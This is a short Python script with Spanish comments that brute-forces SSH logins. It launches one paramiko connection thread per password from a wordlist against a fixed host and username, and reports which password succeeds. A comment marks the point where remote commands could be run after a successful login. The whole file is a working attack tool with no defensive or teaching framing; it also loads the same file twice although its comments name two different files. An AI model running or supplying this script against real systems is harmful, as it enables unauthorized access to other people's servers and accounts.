import threading
import paramiko
import time

def ssh_connect(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname, username=username, password=password)
        print("Conexión SSH exitosa con contraseña:", password)
        # Aquí puedes ejecutar comandos en el servidor remoto si la contraseña es válida
    except paramiko.AuthenticationException:
        print("Error de autenticación. Contraseña incorrecta:", password)
    except paramiko.SSHException as e:
        print("Error en la conexión SSH:", str(e))
    except Exception as e:
        print("Error:", str(e))
    finally:
        ssh.close()

def read_passwords(file_name):
    with open(file_name, "r") as file:
        return [line.strip() for line in file]

# Configura los detalles de conexión SSH
hostname = '172.0.0.1'
username = 'angel'

# Leer contraseñas desde el archivo 'contraseñas.txt'
passwords = read_passwords("merged.txt")

# Leer combinaciones desde el archivo 'combinaciones.txt'
combinations = read_passwords("merged.txt")

# Crear una lista para almacenar los hilos
threads = []

# Obtener el tiempo de inicio
start_time = time.time()

# Probar todas las contraseñas en la conexión SSH
for password in passwords:
    # Crear un hilo para cada llamada a la función ssh_connect
    thread = threading.Thread(target=ssh_connect, args=(hostname, username, password))
    thread.start()
    threads.append(thread)

# Probar todas las combinaciones en la conexión SSH
for combination in combinations:
    # Crear un hilo para cada llamada a la función ssh_connect
    thread = threading.Thread(target=ssh_connect, args=(hostname, username, combination))
    thread.start()
    threads.append(thread)

# Esperar a que todos los hilos terminen
for thread in threads:
    thread.join()

# Obtener el tiempo de finalización
end_time = time.time()

# Calcular el tiempo transcurrido
elapsed_time = end_time - start_time

print("Tiempo transcurrido:", elapsed_time, "segundos")
